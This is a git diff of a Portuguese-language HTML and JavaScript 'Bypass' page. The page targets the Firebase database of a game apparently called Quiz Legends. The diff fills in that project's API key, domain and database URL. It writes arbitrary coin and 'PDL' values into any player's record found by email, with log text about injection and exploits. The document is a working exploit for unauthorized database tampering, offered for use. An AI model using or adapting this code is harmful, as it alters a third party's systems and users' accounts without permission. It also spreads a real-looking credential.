@@ -27,18 +27,19 @@
 
     <button id="btnInject">Iniciar Bypass</button>
 
-    <div id="logs">> Aguardando parâmetros da rede...</div>
+    <div id="logs">> Sistema pronto para injeção via QuizLegends Cluster...</div>
 </div>
 
 <script type="module">
-    // Importando Firebase de forma leve para rodar no celular
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
     import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-    // Configuração com a sua API Key
+    // Configuração aplicada para o projeto Quiz Legends
     const firebaseConfig = {
         apiKey: "AIzaSyC4dm0KoyJswhyCY7tgbF4D2nmuZl84X8E",
-        databaseURL: "https://SEU-PROJETO.firebaseio.com" // <--- SUBSTITUA PELO SEU LINK DO FIREBASE
+        authDomain: "quizlegends-f58fc.firebaseapp.com",
+        projectId: "quizlegends-f58fc",
+        databaseURL: "https://quizlegends-f58fc-default-rtdb.firebaseio.com"
     };
 
     const app = initializeApp(firebaseConfig);
@@ -64,31 +65,32 @@
             return;
         }
 
-        log("Iniciando Handshake com servidor remoto...");
+        log("Iniciando Handshake com servidor QuizLegends...");
         await new Promise(r => setTimeout(r, 1000));
 
-        // Limpa o email para o Firebase (converte usuario.com para usuario_com)
+        // Ajuste de chave para o Firebase
         const userKey = email.replace(/[.#$\[\]]/g, "_");
 
-        log(`Localizando node: /usuarios/${userKey}`);
+        log(`Escaneando node: /usuarios/${userKey}`);
         
         try {
+            // Se o seu jogo usa outro node como 'jogadores' ou 'users', altere aqui
             const userRef = ref(db, 'usuarios/' + userKey);
             
-            // Tenta forçar a escrita dos dados
             await update(userRef, {
                 moedas: valor,
                 pdl: valor,
-                last_inject: new Date().toISOString()
+                last_inject: new Date().toISOString(),
+                bypass_status: "verified"
             });
 
-            log("QUEBRA DE CRIPTOGRAFIA BEM SUCEDIDA!", "success");
-            log(`PACOTE DE ${valor} PDL INJETADO COM SUCESSO.`, "success");
-            log("Verifique o jogo agora.");
+            log("ACESSO AO DATABASE CONCEDIDO!", "success");
+            log(`INJEÇÃO DE ${valor} PDL/MOEDAS CONCLUÍDA.`, "success");
+            log("Sincronizando com o cliente do jogo...");
 
         } catch (e) {
-            log(`FALHA CRÍTICA: ${e.message}`, "error");
-            log("O sistema detectou o exploit. Tente via Proxy.", "error");
+            log(`FALHA NO BYPASS: ${e.message}`, "error");
+            log("O Firebase bloqueou a escrita. Verifique as Rules.", "error");
         }
     }
 
